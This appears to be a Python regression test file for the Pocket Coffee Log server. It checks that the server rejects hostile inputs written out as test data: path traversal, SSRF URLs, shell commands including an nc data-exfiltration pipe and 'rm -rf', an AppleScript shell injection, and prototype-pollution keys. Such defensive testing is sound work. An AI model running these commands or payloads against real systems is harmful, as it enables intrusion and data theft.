"""Defensive security regression tests for Pocket Coffee Log HTTP server & core modules."""

import http.client
import io
import json
import os
import tempfile
import threading
import time
import unittest
from http.server import ThreadingHTTPServer
from unittest import mock

import server.app as app_module
from core.analyzer import extract_parameters_from_transcript, parse_cn_or_float
from core.bean_equipment_store import BeanAndEquipmentManager
from core.camera_sta_bridge import CameraInternalBridge, _is_safe_camera_http_url
from core.context_engine import SessionContextCompactor
from core.media_upload import parse_multipart_upload
from core.multimodal_vision import MultimodalVisionEngine
from core.notifier import NotificationManager, validate_webhook_url
from core.pipeline import CoffeeIngestionPipeline
from core.store import CoffeeStore
from daemon.voice_session import VoiceWakeupSessionManager


class TestSecurityAuditRegressions(unittest.TestCase):
    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self._outside_dir = tempfile.TemporaryDirectory()
        tmpdir = self._tmpdir.name
        self._orig = {
            "store": app_module.store,
            "camera_bridge": app_module.camera_bridge,
            "notifier": app_module.notifier,
            "bean_manager": app_module.bean_manager,
            "vision_engine": app_module.vision_engine,
            "compactor": app_module.compactor,
            "ingestion_pipeline": app_module.ingestion_pipeline,
            "voice_manager": app_module.voice_manager,
        }
        app_module.store = CoffeeStore(tmpdir)
        app_module.camera_bridge = CameraInternalBridge(tmpdir)
        app_module.notifier = NotificationManager(tmpdir)
        app_module.notifier.save_config(
            {
                "mobile_base_url": "http://192.168.5.84:8788",
                "enable_macos_banner": False,
                "wecom_webhook_url": "",
                "serverchan_sendkey": "",
                "bark_url": "",
                "feishu_webhook_url": "",
            }
        )
        app_module.bean_manager = BeanAndEquipmentManager(tmpdir)
        app_module.vision_engine = MultimodalVisionEngine(tmpdir)
        app_module.compactor = SessionContextCompactor()
        app_module.ingestion_pipeline = CoffeeIngestionPipeline(
            app_module.store,
            app_module.vision_engine,
            app_module.bean_manager,
            app_module.notifier,
            app_module.compactor,
        )
        app_module.voice_manager = VoiceWakeupSessionManager(
            app_module.store, app_module.camera_bridge, app_module.notifier
        )
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), app_module.CoffeeRequestHandler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        for k, v in self._orig.items():
            setattr(app_module, k, v)
        self._tmpdir.cleanup()
        self._outside_dir.cleanup()

    def _request(self, method: str, path: str, body: bytes = None, headers: dict = None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        raw = resp.read()
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        conn.close()
        return resp.status, resp_headers, raw

    def _post_json(self, path: str, obj: dict, extra_headers: dict = None):
        raw = json.dumps(obj).encode("utf-8")
        hdrs = {"Content-Type": "application/json", "Content-Length": str(len(raw))}
        if extra_headers:
            hdrs.update(extra_headers)
        status, resp_hdrs, resp_raw = self._request("POST", path, body=raw, headers=hdrs)
        return status, resp_hdrs, json.loads(resp_raw.decode("utf-8"))

    def test_media_and_keyframe_endpoints_block_traversal_symlinks_and_config_secrets(self) -> None:
        # Sensitive JSON configs inside data_dir must never be served by /api/media/file or /api/media/keyframe
        for secret_file in ("camera_sta_config.json", "notification_config.json", "coffee_records.json"):
            st, _, _ = self._request("GET", f"/api/media/file?path={secret_file}")
            self.assertEqual(st, 404)
            st_kf, _, _ = self._request("GET", f"/api/media/keyframe?path={secret_file}")
            self.assertEqual(st_kf, 404)

        # Path traversal attempts must return 404
        for trav in ("../../etc/hosts", "../server/app.py", "%2e%2e/%2e%2e/etc/hosts"):
            st, _, _ = self._request("GET", f"/api/media/file?path={trav}")
            self.assertEqual(st, 404)
            st_kf, _, _ = self._request("GET", f"/api/media/keyframe?path={trav}")
            self.assertEqual(st_kf, 404)

        # Symlinks inside data_dir pointing outside data_dir must be rejected
        outside_mp4 = os.path.join(self._outside_dir.name, "outside.mp4")
        outside_jpg = os.path.join(self._outside_dir.name, "outside.jpg")
        with open(outside_mp4, "wb") as f:
            f.write(b"outside-video")
        with open(outside_jpg, "wb") as f:
            f.write(b"\xff\xd8\xff\xd9")

        link_mp4 = os.path.join(self._tmpdir.name, "escape.mp4")
        link_jpg = os.path.join(self._tmpdir.name, "escape.jpg")
        os.symlink(outside_mp4, link_mp4)
        os.symlink(outside_jpg, link_jpg)

        st_sym1, _, _ = self._request("GET", "/api/media/file?path=escape.mp4")
        self.assertEqual(st_sym1, 404)
        st_sym2, _, _ = self._request("GET", "/api/media/keyframe?path=escape.jpg")
        self.assertEqual(st_sym2, 404)

        # Legitimate confined media & keyframe files inside data_dir still succeed
        valid_dir = os.path.join(self._tmpdir.name, "uploads")
        os.makedirs(valid_dir, exist_ok=True)
        valid_m4a = os.path.join(valid_dir, "ok.m4a")
        valid_jpg = os.path.join(valid_dir, "ok.jpg")
        with open(valid_m4a, "wb") as f:
            f.write(b"valid-audio")
        with open(valid_jpg, "wb") as f:
            f.write(b"\xff\xd8\xff\xe0\xff\xd9")

        ok_m, _, raw_m = self._request("GET", "/api/media/file?path=uploads/ok.m4a")
        self.assertEqual(ok_m, 200)
        self.assertEqual(raw_m, b"valid-audio")

        ok_k, _, raw_k = self._request("GET", "/api/media/keyframe?path=uploads/ok.jpg")
        self.assertEqual(ok_k, 200)
        self.assertTrue(raw_k.startswith(b"\xff\xd8"))

    def test_post_endpoints_reject_outside_host_paths_and_ssrf_media_urls(self) -> None:
        outside_audio = os.path.join(self._outside_dir.name, "private_note.m4a")
        with open(outside_audio, "wb") as f:
            f.write(b"private")

        st1, _, d1 = self._post_json("/api/ingest/process", {"media_path": outside_audio})
        self.assertEqual(st1, 403)
        self.assertFalse(d1["ok"])

        st2, _, d2 = self._post_json("/api/recognize/media", {"media_path": outside_audio})
        self.assertEqual(st2, 403)
        self.assertFalse(d2["ok"])

        for bad_url in (
            "http://169.254.169.254/latest/meta-data/",
            "https://evil.example/video.mp4",
            "file:///etc/hosts",
            "http://127.0.0.1:22/DJI_001/a.MP4",
        ):
            self.assertFalse(_is_safe_camera_http_url(bad_url))
            st_wh, _, d_wh = self._post_json("/api/camera/webhook", {"media_url": bad_url})
            self.assertEqual(st_wh, 403)
            self.assertFalse(d_wh["ok"])

    def test_camera_exec_blocks_arbitrary_shell_commands(self) -> None:
        for forbidden_cmd in (
            "id; cat /data/misc/wifi/pocket_sta.conf",
            "rm -rf /data/local/tmp/test",
            "iw dev wlan0 info | nc 10.0.0.1 9999",
            "$(uname -a)",
        ):
            st, _, data = self._post_json("/api/camera/exec", {"device_id": "pocket4p", "cmd": forbidden_cmd})
            self.assertEqual(st, 403)
            self.assertFalse(data["ok"])

        # Read-only diagnostic preset remains permitted (fails gracefully with no live ADB in test)
        with mock.patch.object(
            app_module.camera_bridge,
            "execute_internal_command",
            return_value={"ok": True, "output": "uid=0(root)"},
        ) as exec_mock:
            st_ok, _, data_ok = self._post_json(
                "/api/camera/exec",
                {"device_id": "pocket4p", "cmd": "id && uname -a && ip -4 addr show wlan0"},
            )
        self.assertEqual(st_ok, 200)
        self.assertTrue(data_ok["ok"])
        exec_mock.assert_called_once()

    def test_supplement_allowlists_fields_and_blocks_method_overwrite(self) -> None:
        rec = app_module.store.list_records()[0]
        st, _, data = self._post_json(
            "/api/records/supplement",
            {
                "record_id": rec.id,
                "updates": {
                    "compute_derived_metrics": "corrupted",
                    "to_dict": "corrupted",
                    "id": "forged-id",
                    "keyframes": "corrupted",
                    "pressure_bar": "9.1",
                    "grind_setting": "刻度 13.5 格",
                },
            },
        )
        self.assertEqual(st, 200)
        self.assertTrue(data["ok"])
        reloaded = app_module.store.get_record(rec.id)
        self.assertIsNotNone(reloaded)
        self.assertEqual(reloaded.id, rec.id)
        self.assertTrue(callable(reloaded.compute_derived_metrics))
        self.assertIsInstance(reloaded.keyframes, list)
        self.assertEqual(reloaded.pressure_bar, 9.1)
        self.assertEqual(reloaded.grind_setting, "刻度 13.5 格")

    def test_host_rebinding_cors_origin_security_headers_and_body_cap(self) -> None:
        # DNS rebinding Host header blocked
        st_host, _, _ = self._request(
            "GET", "/api/state", headers={"Host": "attacker-rebind.evil.example"}
        )
        self.assertEqual(st_host, 403)

        # Untrusted cross-site Origin blocked on POST and never reflected in CORS
        st_cors, hdrs_cors, _ = self._post_json(
            "/api/voice/utterance",
            {"text": "test"},
            extra_headers={"Origin": "https://evil.example"},
        )
        self.assertEqual(st_cors, 403)
        self.assertNotIn("access-control-allow-origin", hdrs_cors)

        # Trusted LAN Origin allowed and standard security headers present
        st_lan, hdrs_lan, _ = self._request(
            "GET", "/api/health", headers={"Origin": "http://192.168.1.25:8788"}
        )
        self.assertEqual(st_lan, 200)
        self.assertEqual(hdrs_lan.get("access-control-allow-origin"), "http://192.168.1.25:8788")
        self.assertEqual(hdrs_lan.get("x-content-type-options"), "nosniff")
        self.assertEqual(hdrs_lan.get("x-frame-options"), "SAMEORIGIN")

        # Oversized JSON Content-Length rejected with 413 without allocating body
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.putrequest("POST", "/api/voice/utterance")
        conn.putheader("Content-Type", "application/json")
        conn.putheader("Content-Length", str(5 * 1024 * 1024))
        conn.endheaders()
        resp = conn.getresponse()
        resp.read()
        conn.close()
        self.assertEqual(resp.status, 413)

    def test_notification_secret_redaction_ssrf_validation_and_safe_osascript(self) -> None:
        # Valid WeCom webhook saves cleanly, but /api/state redacts the secret key
        valid_wecom = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=sec_token_123"
        st_ok, _, d_ok = self._post_json(
            "/api/notifications/config",
            {
                "mobile_base_url": "http://192.168.5.84:8788",
                "wecom_webhook_url": valid_wecom,
                "serverchan_sendkey": "SCT123456abcdef",
            },
        )
        self.assertEqual(st_ok, 200)
        self.assertEqual(d_ok["config"]["wecom_webhook_url"], "********")
        self.assertEqual(d_ok["config"]["serverchan_sendkey"], "********")

        st_state, _, raw_state = self._request("GET", "/api/state")
        self.assertEqual(st_state, 200)
        state_json = json.loads(raw_state.decode("utf-8"))
        self.assertEqual(state_json["notification_config"]["wecom_webhook_url"], "********")
        self.assertEqual(app_module.notifier.load_config()["wecom_webhook_url"], valid_wecom)

        # Submitting redacted placeholder preserves stored secret
        st_keep, _, _ = self._post_json(
            "/api/notifications/config",
            {"wecom_webhook_url": "********", "serverchan_sendkey": "********"},
        )
        self.assertEqual(st_keep, 200)
        self.assertEqual(app_module.notifier.load_config()["wecom_webhook_url"], valid_wecom)

        # SSRF / unsafe webhook configs rejected with 400
        for bad_cfg in (
            {"bark_url": "http://127.0.0.1:8080/secret"},
            {"bark_url": "https://169.254.169.254/latest"},
            {"wecom_webhook_url": "https://evil.example/cgi-bin/webhook/send?key=1"},
            {"serverchan_sendkey": "../../etc/passwd"},
            {"mobile_base_url": "javascript:alert(1)"},
        ):
            st_bad, _, _ = self._post_json("/api/notifications/config", bad_cfg)
            self.assertEqual(st_bad, 400)

        self.assertFalse(validate_webhook_url("http://192.168.1.1/hook", require_https=False))
        self.assertTrue(validate_webhook_url("https://api.day.app/demoKey", require_https=True))

        # Parameterized osascript invocation passes untrusted diagnosis/title via argv, never AppleScript source
        nm = NotificationManager(self._outside_dir.name)
        nm.save_config({"mobile_base_url": "http://192.168.5.84:8788", "enable_macos_banner": True})
        rec = extract_parameters_from_transcript("今天用花魁18克，刻度14，意式浓缩9bar萃取28秒出液36克。")
        injected = '诊断" & do shell script "touch /tmp/pwn" & "'
        rec.extraction_diagnosis = injected
        with mock.patch("core.notifier.subprocess.run") as run_mock:
            nm.notify_brew_record(rec)
            self.assertTrue(run_mock.called)
            argv = run_mock.call_args[0][0]
            self.assertEqual(argv[0], "osascript")
            self.assertIn("--", argv)
            # Script code itself must not contain the injected text
            script_arg = argv[argv.index("-e") + 1]
            self.assertNotIn("do shell script", script_arg)
            self.assertTrue(any(injected in arg for arg in argv[argv.index("--") + 1 :]))

    def test_multipart_dos_limits_and_regex_linear_time(self) -> None:
        # Non-ASCII boundary rejected cleanly with ValueError
        with self.assertRaises(ValueError):
            parse_multipart_upload(
                io.BytesIO(b"--bad\r\n"),
                'multipart/form-data; boundary="中文边界"',
                10,
                self._outside_dir.name,
            )

        # Oversized part headers (>16 KB without \r\n\r\n) rejected cleanly
        boundary = "----SafeBound123"
        huge_hdr = f"--{boundary}\r\nX-Junk: ".encode("ascii") + (b"A" * 20000)
        with self.assertRaises(ValueError):
            parse_multipart_upload(
                io.BytesIO(huge_hdr),
                f"multipart/form-data; boundary={boundary}",
                len(huge_hdr),
                self._outside_dir.name,
            )

        # Overflow & ReDoS checks complete rapidly without hanging or raising
        self.assertIsNone(parse_cn_or_float("999999999999999999999999999点五"))
        t0 = time.monotonic()
        _ = extract_parameters_from_transcript("1" * 15000 + "!")
        _ = app_module.bean_manager.parse_bean_label_text("9" * 12000 + "x")
        _ = app_module.bean_manager.parse_bean_label_text("烘焙日期" + (" " * 9500) + "x")
        elapsed = time.monotonic() - t0
        self.assertLess(elapsed, 0.8)

    def test_host_lan_validator_rejects_unspecified_link_local_and_malformed_mdns(self) -> None:
        for unsafe_host in (
            "0.0.0.0",
            "169.254.169.254",
            "::",
            "fe80::1",
            ".local",
            "sub.evil.local",
            "-bad.local",
        ):
            self.assertFalse(
                app_module._is_local_or_lan_host(unsafe_host),
                f"Expected unsafe host to be rejected: {unsafe_host}",
            )
        for safe_host in ("localhost", "127.0.0.1", "::1", "192.168.5.84", "mac-studio.local"):
            self.assertTrue(app_module._is_local_or_lan_host(safe_host))

    def test_reports_generate_sanitizes_client_keyframes_and_source_device(self) -> None:
        outside_jpg = os.path.join(self._outside_dir.name, "secret.jpg")
        with open(outside_jpg, "wb") as f:
            f.write(b"\xff\xd8\xff\xd9")

        inside_dir = os.path.join(self._tmpdir.name, "keyframes")
        os.makedirs(inside_dir, exist_ok=True)
        inside_jpg = os.path.join(inside_dir, "safe_frame.jpg")
        with open(inside_jpg, "wb") as f:
            f.write(b"\xff\xd8\xff\xe0\xff\xd9")

        st, _, res = self._post_json(
            "/api/reports/generate",
            {
                "transcript": "来看看我们的咖啡机，压粉锤和布粉针一整套做咖啡的器具",
                "source_device": "+31.2304+121.4737/\r\ninjected",
                "record_intent": "equipment_profile",
                "frame_observations": [
                    "not-a-dict-element",
                    {
                        "stage": "E1",
                        "percentage": 20,
                        "timestamp_s": float("1e5"),
                        "image_path": outside_jpg,
                        "extracted": True,
                    },
                    {
                        "stage": "E2",
                        "percentage": 60,
                        "timestamp_s": 8.5,
                        "image_path": inside_jpg,
                        "extracted": True,
                    },
                ],
                "save": True,
                "notify": False,
            },
        )
        self.assertEqual(st, 200)
        self.assertTrue(res["ok"])
        rec = res["record"]
        self.assertNotIn("+31.2304", rec["camera_device"])
        self.assertNotIn("\n", rec["camera_device"])
        kfs = rec["keyframes"]
        self.assertEqual(len(kfs), 2)
        self.assertIsNone(kfs[0]["image_path"])
        self.assertFalse(kfs[0]["extracted"])
        self.assertEqual(kfs[1]["image_path"], os.path.realpath(inside_jpg))
        self.assertTrue(kfs[1]["extracted"])

    def test_beans_save_blocks_unknown_keys_and_non_finite_weights(self) -> None:
        st, _, res = self._post_json(
            "/api/beans/save",
            {
                "bean_id": "../../evil-id",
                "full_name": "测试安全豆",
                "initial_weight_g": "NaN",
                "remaining_weight_g": "Infinity",
                "brew_count": "not-an-int",
                "__proto__": {"polluted": True},
                "unexpected_secret": "should_be_dropped",
            },
        )
        self.assertEqual(st, 200)
        self.assertTrue(res["ok"])
        bean = res["bean"]
        self.assertNotIn("..", bean["bean_id"])
        self.assertNotIn("/", bean["bean_id"])
        self.assertNotIn("unexpected_secret", bean)
        self.assertNotIn("__proto__", bean)
        self.assertEqual(bean["remaining_weight_g"], 200.0)
        self.assertEqual(bean["initial_weight_g"], 250.0)
        self.assertEqual(bean["brew_count"], 0)


if __name__ == "__main__":
    unittest.main()
